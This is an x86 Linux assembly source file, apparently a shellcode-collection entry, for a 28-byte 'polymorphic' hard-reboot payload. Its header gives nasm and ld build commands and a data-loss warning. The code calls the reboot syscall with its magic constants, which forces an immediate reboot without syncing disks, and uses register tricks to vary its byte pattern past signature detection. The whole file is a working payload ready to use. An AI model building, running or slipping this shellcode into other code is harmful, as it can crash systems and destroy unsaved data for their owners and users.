; Polymorphic Hard reboot - Linux x86 architecture
;  (@_Kiewicz)
; GPL License
; 28 bytes
; $ nasm -f elf32 hard_reboot.asm -o hard_reboot.o
; $ ld -o hard_reboot hard_reboot.o
; $ ./hard_reboot
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; WARNING! Be careful, you might reboot and lose data! ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global _start
section .text
_start:
        xor     esi, esi        ; clear out ESI, instead of EAX
        mov     al,0x58
        mov     ebx,0xfee1dead
        mov     ecx,0x28121969
        mov     edx,0x1234567
        int     0x80

        mov     eax, esi        ; Clear out EAX by copying ESI
        inc     eax             ; Increment EAX by 1
        xor     ebx,ebx
        int     0x80
